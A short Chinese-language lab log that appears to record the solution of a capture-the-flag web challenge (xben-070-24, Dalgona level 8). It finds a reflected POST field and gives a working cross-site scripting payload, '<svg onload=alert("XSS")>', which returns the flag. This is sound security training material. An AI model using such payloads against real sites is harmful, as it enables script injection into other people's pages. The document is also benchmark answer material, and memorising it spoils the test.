# xben-070-24 · 探索记录

对应题解：[`xben-070-24.md`](./xben-070-24.md)

## 目标与起点

`10.0.172.219:5000`，Dalgona 第 8 关。表单 `method=post`，字段 `solution`。

## 第一阶段：定位反射

| 请求 | 结果 |
| --- | --- |
| `GET /page?name=TESTX` | 无反射 |
| `POST solution=TESTX` | 页面出现 `TESTX>`（在 input 之后） |

## 第二阶段：直接写标签

```text
solution=<svg onload=alert("XSS")>
```

返回 flag。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 用 GET 的 `name` | 无反射 | 页面里搜不到输入 |
| 闭合 `value="` 的 payload | 不必要 | 反射点不在属性内 |

## 这次真正的收获

先确定「反射落在属性、JS 字符串还是文本节点」，再决定 payload 前缀。
